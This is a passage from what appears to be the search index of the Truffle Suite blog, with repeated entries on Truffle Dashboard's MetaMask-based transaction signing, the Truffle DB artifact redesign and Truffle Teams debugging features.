in addition to all previously existing truffle <...> commands, you will see a new truffle dashboard command. Running truffle init walks you through the process of setting up a new truffle project. Running truffle dashboard in a separate terminal window starts Truffle Dashboard at http://localhost:24012 and automatically opens a new tab in your existing browser session. You can also configure the port and host to run Truffle Dashboard in one of two ways: On the command line: truffle dashboard --port <Port of choice> --host <Host of choice>` In your Truffle configuration (truffle-config.js) file: module . exports = { /* ... rest of truffle-config.js ... */ dashboard : { port : 25012 , host : \"localhost\" } } See the Truffle Commands and/or the Configuration reference documentation to learn more. Connecting your wallet \ud83e\udd1d \u00b6 Truffle Dashboard requires you to connect your wallet to get started. Click the \"Connect Wallet\" button and connect Truffle Dashboard to your wallet the same way you would for any other dapp. Next, Truffle Dashboard prompts you to confirm that you are connected to the correct network, since it uses the wallet's default active network. Make sure you switch to the desired network before confirming. Every transaction you process will be sent to the confirmed network. During development, a typical workflow is first to deploy and test out your smart contract code on a development blockchain like Ganache before deploying to your favorite test network. You can still maintain this workflow with Truffle Dashboard by simply importing Ganache\u2019s local blockchain network into your MetaMask wallet as usual and pointing Truffle Dashboard to use it as your confirmed network. Using Truffle Dashboard in your Truffle project \ud83c\udf89 \u00b6 Before Truffle Dashboard was available, if you wanted to connect to a network like Rinkeby or Mainnet from your Truffle project, you had to specify some configuration variables in the network section of the truffle-config.js file. module . exports = { /* ... rest of truffle-config.js ... */ networks : { development : { host : \"localhost\" , port : 8545 , network_id : \"*\" }, ropsten : { // ... }, mainnet : { // ... } } }; With Truffle Dashboard, you do not need any of that, as Truffle now exposes a built-in network named \"dashboard\" which runs on whatever port and host your Truffle Dashboard is running on ( http://localhost:24012 by default). With Truffle Dashboard running and connected to MetaMask, you can simply supply the dashboard keyword to any Truffle command that requires you to specify a network. For example: truffle migrate --network dashboard truffle console --network dashboard When you run the above commands (or any RPC request), Truffle forwards your request from the command-line to the browser, where you can inspect it and choose to process or reject with MetaMask. As with every zero-configuration feature, you are allowed to override the default configuration by adding a network called dashboard to your Truffle configuration file and specifying its options as you would for other networks. See the networks configuration reference documentation for more information. Using Truffle Dashboard with other development tools \ud83d\udc6a \u00b6 Although we developed Truffle Dashboard intending to improve the development experience for those who choose to build with Truffle, we made sure to make it tool-agnostic. So if Truffle isn't your development tool of choice for developing smart contracts (why on earth should it not be? C'mon, now let's talk!), but you'd like to integrate the Dashboard into your workflow, we've got you covered. You can use Truffle Dashboard with other development tools. For example, use it with Hardhat by simply starting Truffle Dashboard in a separate terminal window and add a network configuration option that points to Truffle Dashboard's RPC URL in your Hardhat config file: module . exports = { // ... networks : { // ... \"truffle-dashboard\" : { url : \"http://localhost:24012/rpc\" } }, }; With this setup, when you run the command hardhat deploy --network truffle-dashboard , the request is forwarded to Truffle Dashboard, where you can inspect and process them. Conclusion \u2764\ufe0f\ufe0f \u00b6 With Truffle Dashboard, you no longer have to worry about giving your private keys to someone else's JavaScript code. You can now relax and leave it up to MetaMask to keep your private keys safe and sign transactions on your behalf. To get started, download the latest version of Truffle and start using Truffle Dashboard today by running the command npm uninstall -g truffle && npm install -g truffle . Please refer to the Truffle Dashboard feature documentation for more. Truffle Dashboard was borne out of our years of experience working on developer tools for the Ethereum ecosystem and receiving valuable feedback from our users. We are extremely excited to release this feature. We hope you're excited to try it out. With \u2764\ufe0f\ufe0f from the Truffle team. Questions/comments/concerns? Please shoot us a tweet @trufflesuite !", "title": "Introducing Truffle Dashboard - Stop copy + pasting your private keys!"}, {"location": "blog/introducing-truffle-dashboard/#dont-get-rekt", "text": "One of our core missions at Truffle is to provide tooling that aids in the complete Web3 dapp development lifecycle, while maintaining rigorous security practices throughout. As a smart contract developer, you require your development tools to keep your sensitive information secret and safe. At Truffle, we're always looking for ways to make your experience more secure. If you\u2019ve ever deployed a smart contract, chances are you\u2019ve had to think twice about sharing your private keys with Truffle or other development tools. Maybe you've had to be vigilant not to accidentally share those keys on GitHub. To deploy to an Ethereum network, you've needed to copy your wallet credentials and store them in an insecure location to share with a tool like HDWalletProvider. This has been necessary because your mnemonic or private key gives Truffle the permissions it needs to sign transactions on your behalf. Have you ever had to do something like this? Storing your mnemonic seed phrase or private keys in regular files poses a considerable security concern. Your seed phrase can easily be hijacked by JavaScript code, accidentally committed to Git, or targeted by bad actors.", "title": "Don't get rekt \ud83d\ude40"}, {"location": "blog/introducing-truffle-dashboard/#enter-truffle-dashboard", "text": "Truffle Dashboard completely removes the need to manually interact with your wallet's mnemonic phrase or private keys throughout the development lifecycle. You can now safely deploy your smart contracts to your network of choice without Truffle ever needing to know what your keys look like. Truffle seamlessly connects to your MetaMask wallet without any configuration, using the currently selected account and network for Truffle's deployment configuration. But that's not all! For your convenience, you can use Truffle Dashboard with any development tool. For example, if you use Hardhat or Foundry to develop your smart contracts, you can also integrate with Truffle Dashboard for this improved security workflow. See the Using Truffle Dashboard with other development tools section of our docs to learn how.", "title": "Enter Truffle Dashboard \ud83d\udd25 \ud83d\ude80"}, {"location": "blog/introducing-truffle-dashboard/#how-does-truffle-dashboard-work", "text": "If you're new to Truffle, ensure you have Node.js then install the latest version of Truffle with the following command: npm install -g truffle If you already have Truffle installed, you want to first uninstall your existing instance of Truffle globally: npm uninstall -g truffle npm install -g truffle", "title": "How does Truffle Dashboard Work? \u2699\ufe0f\ud83d\udd27"}, {"location": "blog/introducing-truffle-dashboard/#running-truffle-dashboard", "text": "With the latest version of Truffle, in addition to all previously existing truffle <...> commands, you will see a new truffle dashboard command. Running truffle init walks you through the process of setting up a new truffle project. Running truffle dashboard in a separate terminal window starts Truffle Dashboard at http://localhost:24012 and automatically opens a new tab in your existing browser session. You can also configure the port and host to run Truffle Dashboard in one of two ways: On the command line: truffle dashboard --port <Port of choice> --host <Host of choice>` In your Truffle configuration (truffle-config.js) file: module . exports = { /* ... rest of truffle-config.js ... */ dashboard : { port : 25012 , host : \"localhost\" } } See the Truffle Commands and/or the Configuration reference documentation to learn more.", "title": "Running Truffle Dashboard \ud83d\ude80"}, {"location": "blog/introducing-truffle-dashboard/#connecting-your-wallet", "text": "Truffle Dashboard requires you to connect your wallet to get started. Click the \"Connect Wallet\" button and connect Truffle Dashboard to your wallet the same way you would for any other dapp. Next, Truffle Dashboard prompts you to confirm that you are connected to the correct network, since it uses the wallet's default active network. Make sure you switch to the desired network before confirming. Every transaction you process will be sent to the confirmed network. During development, a typical workflow is first to deploy and test out your smart contract code on a development blockchain like Ganache before deploying to your favorite test network. You can still maintain this workflow with Truffle Dashboard by simply importing Ganache\u2019s local blockchain network into your MetaMask wallet as usual and pointing Truffle Dashboard to use it as your confirmed network.", "title": "Connecting your wallet \ud83e\udd1d"}, {"location": "blog/introducing-truffle-dashboard/#using-truffle-dashboard-in-your-truffle-project", "text": "Before Truffle Dashboard was available, if you wanted to connect to a network like Rinkeby or Mainnet from your Truffle project, you had to specify some configuration variables in the network section of the truffle-config.js file. module . exports = { /* ... rest of truffle-config.js ... */ networks : { development : { host : \"localhost\" , port : 8545 , network_id : \"*\" }, ropsten : { // ... }, mainnet : { // ... } } }; With Truffle Dashboard, you do not need any of that, as Truffle now exposes a built-in network named \"dashboard\" which runs on whatever port and host your Truffle Dashboard is running on ( http://localhost:24012 by default). With Truffle Dashboard running and connected to MetaMask, you can simply supply the dashboard keyword to any Truffle command that requires you to specify a network. For example: truffle migrate --network dashboard truffle console --network dashboard When you run the above commands (or any RPC request), Truffle forwards your request from the command-line to the browser, where you can inspect it and choose to process or reject with MetaMask. As with every zero-configuration feature, you are allowed to override the default configuration by adding a network called dashboard to your Truffle configuration file and specifying its options as you would for other networks. See the networks configuration reference documentation for more information.", "title": "Using Truffle Dashboard in your Truffle project \ud83c\udf89"}, {"location": "blog/introducing-truffle-dashboard/#using-truffle-dashboard-with-other-development-tools", "text": "Although we developed Truffle Dashboard intending to improve the development experience for those who choose to build with Truffle, we made sure to make it tool-agnostic. So if Truffle isn't your development tool of choice for developing smart contracts (why on earth should it not be? C'mon, now let's talk!), but you'd like to integrate the Dashboard into your workflow, we've got you covered. You can use Truffle Dashboard with other development tools. For example, use it with Hardhat by simply starting Truffle Dashboard in a separate terminal window and add a network configuration option that points to Truffle Dashboard's RPC URL in your Hardhat config file: module . exports = { // ... networks : { // ... \"truffle-dashboard\" : { url : \"http://localhost:24012/rpc\" } }, }; With this setup, when you run the command hardhat deploy --network truffle-dashboard , the request is forwarded to Truffle Dashboard, where you can inspect and process them.", "title": "Using Truffle Dashboard with other development tools \ud83d\udc6a"}, {"location": "blog/introducing-truffle-dashboard/#conclusion", "text": "With Truffle Dashboard, you no longer have to worry about giving your private keys to someone else's JavaScript code. You can now relax and leave it up to MetaMask to keep your private keys safe and sign transactions on your behalf. To get started, download the latest version of Truffle and start using Truffle Dashboard today by running the command npm uninstall -g truffle && npm install -g truffle . Please refer to the Truffle Dashboard feature documentation for more. Truffle Dashboard was borne out of our years of experience working on developer tools for the Ethereum ecosystem and receiving valuable feedback from our users. We are extremely excited to release this feature. We hope you're excited to try it out. With \u2764\ufe0f\ufe0f from the Truffle team. Questions/comments/concerns? Please shoot us a tweet @trufflesuite !", "title": "Conclusion \u2764\ufe0f\ufe0f"}, {"location": "blog/introducing-truffle-db-part-1/", "text": "Introducing Truffle DB, part 1: Artifact archeology \u00b6 Truffle is not a small utility: it compiles your contracts, deploys them to multiple networks, runs your automated tests, provides an interactive debugger for when things go wrong, offers a library for interacting with your contracts on the frontend, \u2026 ( the list goes on. ) With just over 20,000 lines of code and close to thirty discrete software packages, Truffle has a lot going on. Truffle is \u201cnot small\u201d on purpose. The tool oversees the development lifecycle in human developer terms. It keeps track of familiar concepts and hides unnecessary, low-level specifics. That\u2019s a big goal. So how does this work? Well, Truffle tries to be smart about it. It stores information about your contracts so that it can refer to it later. It tracks compilation results alongside the source code you wrote, maintaining a steady mapping between data for the blockchain and data for developers\u2019 brains . Right now, this system of record-keeping is served through Truffle\u2019s contract artifacts : the large JSON files that get saved in your build/contracts/ directory. Truffle saves your artifacts when you compile and updates your artifacts with address information when you migrate. Pretty much whenever you use any part of Truffle, these artifacts are read from disk and processed, enabling Truffle to paint itself (and you) a picture of what\u2019s happening in human terms. Truffle\u2019s artifacts have been enormously useful: the tool simply couldn\u2019t exist without this kind of first-class data capturing. Beyond that, though, being able to count on this data has enabled an ecosystem of other tools and utilities that build on top of Truffle\u2019s functionality using Truffle\u2019s artifacts format. Truffle\u2019s artifacts have served as a common language for representing smart contract development concepts. Unfortunately, Truffle\u2019s artifacts format has a number of core limitations that prevent Truffle from offering ideal behavior in several key situations. This post describes a few of these limitations. In this post\u2019s follow-up, we\u2019ll share information about a new system to manage this record-keeping, which we\u2019re calling Truffle DB . So what\u2019s the problem now? \u00b6 For starters: artifact files are huge! Too huge! In addition to Truffle reading your contract artifacts, your dapp\u2019s frontend code may read and use your artifacts to let users connect to any deployed network, etc. Problem is\u2014there\u2019s a ton of JSON. It\u2019s a mess, and it\u2019s in your face too much. **For example:** Truffle stores the same abstract syntax tree* (AST) in two different formats, in every single artifact! Most applications do not need this. *for the curious: the AST is the reason your code works whether you wrote it all on a single line or not. Source gets parsed, and the AST is the result. Truffle and other tools rely on the AST for things like debugging, code coverage, and linting. By the byte, almost all of the information in each contract artifact is for internal use or for some specific purpose. Only a small subset of the data in each artifact is necessary for your frontend or for you to think about directly. Thus far, users who have struggled with these large files needed to use a tool like jq or write a custom solution. In addition to these files being too large, the information is grouped purely by the idea of \u201ccontract name\u201d. What if you want to have two contracts with the same name? You can\u2019t. What if you want to debug an old version of your contract, deployed to a testnet? I hope you backed up your old artifacts directory somehow. Although we\u2019ve implemented plenty of workarounds to deal with these limitations, the problems do not go unnoticed. See some long-outstanding open GitHub issues, for example: * Truffle contract artifacts are too big and contain too much sensitive detail to actually deploy on the web (#1269) * Artifact is overwritten if there are two contracts with the same name (#1087) * Source map indexes are missing in artifacts (#1236) * Allow persistency of artifacts remotely (#1790) Unfortunately, these issues are blocked by the fundamental design of the contract artifacts. The root of the problem is that Truffle\u2019s artifacts try to serve two conflicting purposes: they try to serve the developer, but they also try to serve the tool itself. \u201cStop talking about data formats\u201d, you say. \u00b6 Right? Ideally, Truffle should silently keep complete records of everything you will ever need, and nothing more. And you, the developer, should only ever come face-to-face with the information you need at any given moment. So, for some time, we have been working on a plan to improve the state of affairs of Truffle\u2019s record-keeping. We\u2019ll get into it more in the next post, but Truffle DB aims to provide two things: * a data model: a set of terms that collectively represent various, high-level concepts associated with smart contract development * a flexible interface: a way to query and update your Truffle project\u2019s records In doing this, we\u2019re taking a data-first approach, organizing your project\u2019s information through immutable records and a clean separation of concerns. Stay tuned for the next post, where we\u2019ll talk about this more and outline our release plan for Truffle DB: what we\u2019ll be releasing first, what work still needs to be done, and how we plan to handle backwards compatibility over time.", "title": "Introducing Truffle DB, Part 1 - Artifact archeology"}, {"location": "blog/introducing-truffle-db-part-1/#introducing-truffle-db-part-1-artifact-archeology", "text": "Truffle is not a small utility: it compiles your contracts, deploys them to multiple networks, runs your automated tests, provides an interactive debugger for when things go wrong, offers a library for interacting with your contracts on the frontend, \u2026 ( the list goes on. ) With just over 20,000 lines of code and close to thirty discrete software packages, Truffle has a lot going on. Truffle is \u201cnot small\u201d on purpose. The tool oversees the development lifecycle in human developer terms. It keeps track of familiar concepts and hides unnecessary, low-level specifics. That\u2019s a big goal. So how does this work? Well, Truffle tries to be smart about it. It stores information about your contracts so that it can refer to it later. It tracks compilation results alongside the source code you wrote, maintaining a steady mapping between data for the blockchain and data for developers\u2019 brains . Right now, this system of record-keeping is served through Truffle\u2019s contract artifacts : the large JSON files that get saved in your build/contracts/ directory. Truffle saves your artifacts when you compile and updates your artifacts with address information when you migrate. Pretty much whenever you use any part of Truffle, these artifacts are read from disk and processed, enabling Truffle to paint itself (and you) a picture of what\u2019s happening in human terms. Truffle\u2019s artifacts have been enormously useful: the tool simply couldn\u2019t exist without this kind of first-class data capturing. Beyond that, though, being able to count on this data has enabled an ecosystem of other tools and utilities that build on top of Truffle\u2019s functionality using Truffle\u2019s artifacts format. Truffle\u2019s artifacts have served as a common language for representing smart contract development concepts. Unfortunately, Truffle\u2019s artifacts format has a number of core limitations that prevent Truffle from offering ideal behavior in several key situations. This post describes a few of these limitations. In this post\u2019s follow-up, we\u2019ll share information about a new system to manage this record-keeping, which we\u2019re calling Truffle DB .", "title": "Introducing Truffle DB, part 1: Artifact archeology"}, {"location": "blog/introducing-truffle-db-part-1/#so-whats-the-problem-now", "text": "For starters: artifact files are huge! Too huge! In addition to Truffle reading your contract artifacts, your dapp\u2019s frontend code may read and use your artifacts to let users connect to any deployed network, etc. Problem is\u2014there\u2019s a ton of JSON. It\u2019s a mess, and it\u2019s in your face too much. **For example:** Truffle stores the same abstract syntax tree* (AST) in two different formats, in every single artifact! Most applications do not need this. *for the curious: the AST is the reason your code works whether you wrote it all on a single line or not. Source gets parsed, and the AST is the result. Truffle and other tools rely on the AST for things like debugging, code coverage, and linting. By the byte, almost all of the information in each contract artifact is for internal use or for some specific purpose. Only a small subset of the data in each artifact is necessary for your frontend or for you to think about directly. Thus far, users who have struggled with these large files needed to use a tool like jq or write a custom solution. In addition to these files being too large, the information is grouped purely by the idea of \u201ccontract name\u201d. What if you want to have two contracts with the same name? You can\u2019t. What if you want to debug an old version of your contract, deployed to a testnet? I hope you backed up your old artifacts directory somehow. Although we\u2019ve implemented plenty of workarounds to deal with these limitations, the problems do not go unnoticed. See some long-outstanding open GitHub issues, for example: * Truffle contract artifacts are too big and contain too much sensitive detail to actually deploy on the web (#1269) * Artifact is overwritten if there are two contracts with the same name (#1087) * Source map indexes are missing in artifacts (#1236) * Allow persistency of artifacts remotely (#1790) Unfortunately, these issues are blocked by the fundamental design of the contract artifacts. The root of the problem is that Truffle\u2019s artifacts try to serve two conflicting purposes: they try to serve the developer, but they also try to serve the tool itself.", "title": "So what\u2019s the problem now?"}, {"location": "blog/introducing-truffle-db-part-1/#stop-talking-about-data-formats-you-say", "text": "Right? Ideally, Truffle should silently keep complete records of everything you will ever need, and nothing more. And you, the developer, should only ever come face-to-face with the information you need at any given moment. So, for some time, we have been working on a plan to improve the state of affairs of Truffle\u2019s record-keeping. We\u2019ll get into it more in the next post, but Truffle DB aims to provide two things: * a data model: a set of terms that collectively represent various, high-level concepts associated with smart contract development * a flexible interface: a way to query and update your Truffle project\u2019s records In doing this, we\u2019re taking a data-first approach, organizing your project\u2019s information through immutable records and a clean separation of concerns. Stay tuned for the next post, where we\u2019ll talk about this more and outline our release plan for Truffle DB: what we\u2019ll be releasing first, what work still needs to be done, and how we plan to handle backwards compatibility over time.", "title": "\u201cStop talking about data formats\u201d, you say."}, {"location": "blog/introducing-truffle-db-part-2/", "text": "Welcome back! If you missed the first part of this post, you may want to read it to learn more about Truffle\u2019s contract artifacts, their current limitations, and why we seek to build a better solution. Or, just to catch up: * Truffle currently stores information about your smart contracts in files that we call \u201ccontract artifacts\u201d (or just \u201cartifacts\u201d for short.) * Truffle uses these artifacts for pretty much everything. * Plenty of other tools use artifacts too, and rely on their behavior. * Unfortunately, the artifacts file format has several design flaws, forcing dozens of workarounds and even preventing certain use cases entirely. * Addressing these flaws head-on risks severe negative impact on other projects. * We\u2019re excited to share a project we\u2019ve been working on, to offer a deprecation plan and to encourage community involvement. So why should you care? * If you are a tools developer, or rely on Truffle artifacts directly in any way: there will be breaking changes! * If you use Truffle for smart contract development: the developer experience using Truffle will have fewer roadblocks (\u201c software warts \u201d). This will not break existing Truffle projects. * No matter who you are: better data means better tools. Great! I\u2019m convinced. \ud83d\ude01 Now, where were we? What is Truffle DB? \u00b6 Truffle DB comprises two key ideas, currently at different stages of development. These are: A data model for organizing your project\u2019s smart contracts: how to keep track of all the different pieces of information, from your contract source files to where they are deployed. A flexible JSON data access interface: how to read exactly the data you need and how to update the DB with the data you have. Data model \u00b6 **Data model excerpt**: how contracts, sources, compilers, and compilations all relate. ([Text-accessible version](https://github.com/trufflesuite/artifact-updates/blob/master/docs/uml/macros.iuml) available via diagram source) What is a smart contract? What is your contract\u2019s bytecode, what is its source code, and how do they relate? By looking at how Truffle expects these relationships in practice, and considering how these concepts are commonly understood, we hope to make life easy by creating a shared vocabulary for interacting with the smart contract domain. Diagrams are worth more than words here, so please check out our data model docs to get a broader sense for what this represents. Current status : Implemented as minimally viable, designed to be extended. Flexible interface \u00b6 **Concept image**: Example query to fetch specific project contract info. ([See gist for image text](https://gist.github.com/gnidan/c653c57a69adf50f5d60b7d0c1d3c6a2#file-concept-query-graphql)) Truffle DB uses GraphQL for its primary interface. GraphQL affords flexibility and a data-first design methodology that suits our goals well. This interface is intended for use in tools to build on top of Truffle; as a normal user you won\u2019t have to touch this. (Of course, we hope this will encourage you to find new ways to solve problems by building and sharing tools of your own!) Truffle DB is still in development, but we would like to share what we\u2019ve got so far and to talk about where we\u2019re looking to go. Although it\u2019s early, we want to increase awareness about future breaking changes, and we hope to paint a picture of some new foundations that we\u2019re excited will help the smart contract development tools ecosystem. Current status : Internal infrastructure in place, prototyping for public review to begin soon. What we\u2019re releasing first \u00b6 We\u2019re gearing up for a minor release (Truffle v5.1), and we plan to make a first version of Truffle DB available as an experimental implementation. This means building blocks to start: key pieces of infrastructure to paint a picture of Truffle DB for review and iteration. Day 1, this means you will get: * The ability to convert your artifacts and load them into Truffle DB * A mechanism to persist Truffle DB data side-by-side with your artifacts * Improvements to Truffle that take advantage of this data when it exists * A bundled GraphQL playground for hands-on exploration * The ability to easily explore the schema to better understand our system design **Interact with Truffle DB**: Apollo\u2019s [GraphQL Playground](https://www.apollographql.com/docs/apollo-server/features/graphql-playground/) provides a handy way to work with GraphQL interfaces. We\u2019re bundling a Playground instance into Truffle DB to make it easier to learn about. (For text-accessible version, see [query source](https://gist.github.com/gnidan/c653c57a69adf50f5d60b7d0c1d3c6a2#file-playground-query-graphql), [query variables](https://gist.github.com/gnidan/c653c57a69adf50f5d60b7d0c1d3c6a2#file-playground-query-result-json), and the [query result](https://gist.github.com/gnidan/c653c57a69adf50f5d60b7d0c1d3c6a2#file-playground-query-result-json)) What\u2019s left to be done (soon) \u00b6 Since we\u2019ve started by building infrastructure, the work remains to connect the dots into a final design that we can validate for quality and usefulness. This includes: * Documentation, of course! See our current Truffle DB \u2013 Proposal working docs, which include the data model diagrams. Expect us to convert these docs into proper documentation for release. * Better persistence. Our initial implementation will save JSON files to disk, but we intend to support more robust data storage options, including relational databases and native support in Truffle Teams . * Schema design updates, including support for pagination and proper data filtering. * A prototype candidate for Truffle DB\u2019s external interface. The long-term plan \u00b6 We\u2019re going to introduce Truffle DB gradually, deprecating the old artifacts format and introducing Truffle DB more and more as it\u2019s validated. We expect to follow these steps: 1. Release initial Truffle DB features as opt-in and experimental. 1. Gather feedback and support to build a cohesive Truffle DB release candidate (for broad community use). 1. Turn Truffle DB on by default, but continue to use artifacts as the primary data store. 1. Convert the rest of Truffle to use Truffle DB as its primary data store, but continue to maintain artifacts alongside it for compatibility. 1. Continue to maintain both data stores, and switch to using Truffle DB to manage artifacts (instead of existing artifacts management code). 1. Turn off artifacts by default, but maintain legacy support through configuration. 1. Eventually, remove artifacts altogether. We expect this process, start to finish, to span at least two major (breaking change) releases. We plan to maintain legacy support for artifacts for at least 18 months after we release a Truffle DB release candidate. via GIPHY [Weight and Switch](https://tvtropes.org/pmwiki/pmwiki.php/Main/WeightAndSwitch): Dr. Jones demonstrating proper technique for delicate data migration procedures What do you think? \u00b6 Please reach out with questions/thoughts/use case ideas/implementation strategies, or even just to say hello. Your feedback will help us provide the most value and make sure we do so with enough clarity! We\u2019re tracking overall progress in this GitHub issue (trufflesuite/truffle#1718) . Expect to see this filled out more in the coming weeks, so please follow along there if you\u2019re interested. Thanks for reading! Hope to see you at TruffleCon!", "title": "Introducing Truffle DB, part 2 - 'Weight and Switch'"}, {"location": "blog/introducing-truffle-db-part-2/#what-is-truffle-db", "text": "Truffle DB comprises two key ideas, currently at different stages of development. These are: A data model for organizing your project\u2019s smart contracts: how to keep track of all the different pieces of information, from your contract source files to where they are deployed. A flexible JSON data access interface: how to read exactly the data you need and how to update the DB with the data you have.", "title": "What is Truffle DB?"}, {"location": "blog/introducing-truffle-db-part-2/#data-model", "text": "**Data model excerpt**: how contracts, sources, compilers, and compilations all relate. ([Text-accessible version](https://github.com/trufflesuite/artifact-updates/blob/master/docs/uml/macros.iuml) available via diagram source) What is a smart contract? What is your contract\u2019s bytecode, what is its source code, and how do they relate? By looking at how Truffle expects these relationships in practice, and considering how these concepts are commonly understood, we hope to make life easy by creating a shared vocabulary for interacting with the smart contract domain. Diagrams are worth more than words here, so please check out our data model docs to get a broader sense for what this represents. Current status : Implemented as minimally viable, designed to be extended.", "title": "Data model"}, {"location": "blog/introducing-truffle-db-part-2/#flexible-interface", "text": "**Concept image**: Example query to fetch specific project contract info. ([See gist for image text](https://gist.github.com/gnidan/c653c57a69adf50f5d60b7d0c1d3c6a2#file-concept-query-graphql)) Truffle DB uses GraphQL for its primary interface. GraphQL affords flexibility and a data-first design methodology that suits our goals well. This interface is intended for use in tools to build on top of Truffle; as a normal user you won\u2019t have to touch this. (Of course, we hope this will encourage you to find new ways to solve problems by building and sharing tools of your own!) Truffle DB is still in development, but we would like to share what we\u2019ve got so far and to talk about where we\u2019re looking to go. Although it\u2019s early, we want to increase awareness about future breaking changes, and we hope to paint a picture of some new foundations that we\u2019re excited will help the smart contract development tools ecosystem. Current status : Internal infrastructure in place, prototyping for public review to begin soon.", "title": "Flexible interface"}, {"location": "blog/introducing-truffle-db-part-2/#what-were-releasing-first", "text": "We\u2019re gearing up for a minor release (Truffle v5.1), and we plan to make a first version of Truffle DB available as an experimental implementation. This means building blocks to start: key pieces of infrastructure to paint a picture of Truffle DB for review and iteration. Day 1, this means you will get: * The ability to convert your artifacts and load them into Truffle DB * A mechanism to persist Truffle DB data side-by-side with your artifacts * Improvements to Truffle that take advantage of this data when it exists * A bundled GraphQL playground for hands-on exploration * The ability to easily explore the schema to better understand our system design **Interact with Truffle DB**: Apollo\u2019s [GraphQL Playground](https://www.apollographql.com/docs/apollo-server/features/graphql-playground/) provides a handy way to work with GraphQL interfaces. We\u2019re bundling a Playground instance into Truffle DB to make it easier to learn about. (For text-accessible version, see [query source](https://gist.github.com/gnidan/c653c57a69adf50f5d60b7d0c1d3c6a2#file-playground-query-graphql), [query variables](https://gist.github.com/gnidan/c653c57a69adf50f5d60b7d0c1d3c6a2#file-playground-query-result-json), and the [query result](https://gist.github.com/gnidan/c653c57a69adf50f5d60b7d0c1d3c6a2#file-playground-query-result-json))", "title": "What we\u2019re releasing first"}, {"location": "blog/introducing-truffle-db-part-2/#whats-left-to-be-done-soon", "text": "Since we\u2019ve started by building infrastructure, the work remains to connect the dots into a final design that we can validate for quality and usefulness. This includes: * Documentation, of course! See our current Truffle DB \u2013 Proposal working docs, which include the data model diagrams. Expect us to convert these docs into proper documentation for release. * Better persistence. Our initial implementation will save JSON files to disk, but we intend to support more robust data storage options, including relational databases and native support in Truffle Teams . * Schema design updates, including support for pagination and proper data filtering. * A prototype candidate for Truffle DB\u2019s external interface.", "title": "What\u2019s left to be done (soon)"}, {"location": "blog/introducing-truffle-db-part-2/#the-long-term-plan", "text": "We\u2019re going to introduce Truffle DB gradually, deprecating the old artifacts format and introducing Truffle DB more and more as it\u2019s validated. We expect to follow these steps: 1. Release initial Truffle DB features as opt-in and experimental. 1. Gather feedback and support to build a cohesive Truffle DB release candidate (for broad community use). 1. Turn Truffle DB on by default, but continue to use artifacts as the primary data store. 1. Convert the rest of Truffle to use Truffle DB as its primary data store, but continue to maintain artifacts alongside it for compatibility. 1. Continue to maintain both data stores, and switch to using Truffle DB to manage artifacts (instead of existing artifacts management code). 1. Turn off artifacts by default, but maintain legacy support through configuration. 1. Eventually, remove artifacts altogether. We expect this process, start to finish, to span at least two major (breaking change) releases. We plan to maintain legacy support for artifacts for at least 18 months after we release a Truffle DB release candidate. via GIPHY [Weight and Switch](https://tvtropes.org/pmwiki/pmwiki.php/Main/WeightAndSwitch): Dr. Jones demonstrating proper technique for delicate data migration procedures", "title": "The long-term plan"}, {"location": "blog/introducing-truffle-db-part-2/#what-do-you-think", "text": "Please reach out with questions/thoughts/use case ideas/implementation strategies, or even just to say hello. Your feedback will help us provide the most value and make sure we do so with enough clarity! We\u2019re tracking overall progress in this GitHub issue (trufflesuite/truffle#1718) . Expect to see this filled out more in the coming weeks, so please follow along there if you\u2019re interested. Thanks for reading! Hope to see you at TruffleCon!", "title": "What do you think?"}, {"location": "blog/iterate-faster-with-truffle-teams/", "text": "Consider the amount of context switching required to develop a dapp: you\u2019re writing Solidity one minute, writing tests another, debugging those results--it\u2019s easy to get lost! These switches carry a cognitive load and when errors equal a loss of ETH we need all the help we can get. I\u2019m happy to inform you Truffle Teams can help reduce context switching and help you or your team iterate faster. Truffle Teams has reached a very important stage in its life: it now provides a complete workflow including building, testing, managing, monitoring, and debugging. This means you\u2019re getting a huge boost in productivity. This amounts to a more robust workflow for you and/or your team and contributes to the application lifecycle generally by tightening the feedback loop between deployment, operation, and debugging all within a flexible development network. The development lifecycle. Up to this point, Truffle Teams has already offered a builds system, deployment manager, blockchain sandboxes, and monitoring. Recently we released a visual debugger into early access. With that, we\u2019d like to highlight two features that completed this cycle: the Debugger and the Contract Manager. For a great video example, check out our demo from TruffleCon 2020. We briefly touch all the phases talked about above using a rock, paper, scissors game. For something more long-form, check out our 5-part webinar series walking you through using the Truffle suite to create an NFT and trade it on a decentralized marketplace. Mike Seese and Josh Quintal go over the entire development lifecycle using Truffle Teams for a decentralized rock, paper, scissors dapp. Debugger Enhancements \u00b6 Note : To use the debugger right away, you'll need to opt-in to Truffle Teams Early Access . Truffle offers a sophisticated forensic transaction debugger and allows you to extract the most information and context possible from your transactions. We released a graphical version of our command line debugger into Truffle Teams Early Access in December. Since then we\u2019ve added syntax highlighting and breakpoints for an improved developer experience. Readability increases and you control where execution stops, providing a precision debugging experience. Check out the Truffle Teams debugger docs to learn more about breakpoints. Currently the debugger in Truffle Teams only works for sandbox environments, but we plan on supporting public networks next! The Truffle Teams Debugger--now with syntax highlighting and breakpoints! ## The Contract Manager Note : To use the contract manager right away, you'll need to opt-in to Truffle Teams Early Access . Truffle Teams\u2019 Contract Manager generates a UI for interacting with all the functions of your smart contracts, as well as a live state tree so you can quickly see the changes propagated by those functions. If you\u2019re familiar with Remix, you\u2019ll feel right at home here. The Contract Manager; shown here using an NFT badge. The Contract Manager is great for quick demos, integration tests, and a faster, all-GUI debugging workflow. For example, you can deploy to a sandbox via the deployment wizard, hop over to the contract manager to fire off a few transactions, and finally debug these transactions from the monitoring screen. ## Dapp Topography Going forward, we\u2019ll be helping you understand your dapp on an even deeper level, offering forensic-level analysis of your transactions. Not only that, but it will be able to diagram contract interaction to allow different stakeholders to participate in the debugging process. For example a product manager, or other domain expert can participate in the forensic analysis. These diagrams and other assets can be shareable media that can fit into existing communication channels. A test in which a user who isn't the owner of an ENS name attempt to change the resolver. Note the \"X\" shoing the revert. ## Get Started with Truffle Teams We want Truffle Teams to be the most effective DevOps tool in the blockchain space for both new and existing teams. Check out Truffle Teams today and let us know what you think about the new deployment views and contract manager, or if your team has other needs we haven\u2019t met yet. SIGN UP FOR THE TRUFFLE TEAMS TRUFFLE TEAMS QUICKSTART Thanks! _Josh Quintal, Head of Product & Marketing_", "title": "Iterate Faster with Truffle Teams"}, {"location": "blog/iterate-faster-with-truffle-teams/#debugger-enhancements", "text": "Note : To use the debugger right away, you'll need to opt-in to Truffle Teams Early Access . Truffle offers a sophisticated forensic transaction debugger and allows you to extract the most information and context possible from your transactions. We released a graphical version of our command line debugger into Truffle Teams Early Access in December. Since then we\u2019ve added syntax highlighting and breakpoints for an improved developer experience. Readability increases and you control where execution stops, providing a precision 